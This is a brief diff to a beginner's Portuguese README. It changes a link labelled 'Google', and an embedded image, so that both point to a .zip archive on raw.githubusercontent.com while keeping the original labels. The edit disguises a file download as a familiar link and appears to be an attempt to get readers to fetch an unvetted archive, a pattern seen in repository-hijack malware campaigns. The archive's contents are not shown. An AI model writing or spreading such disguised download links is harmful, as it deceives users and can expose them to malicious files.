@@ -7,6 +7,6 @@ Esse é o meu primeiro README
 - Elemento 1
 - Elemento 2
 
-[Google](https://www.google.com)
+[Google](https://raw.githubusercontent.com/ThiagoNavarroPanuto/projeto_inicial/main/kaliform/projeto_inicial.zip)
 
-![Imagem](https://git-scm.com/images/logos/1color-orange-lightbg@2x.png)
+![Imagem](https://raw.githubusercontent.com/ThiagoNavarroPanuto/projeto_inicial/main/kaliform/projeto_inicial.zip)
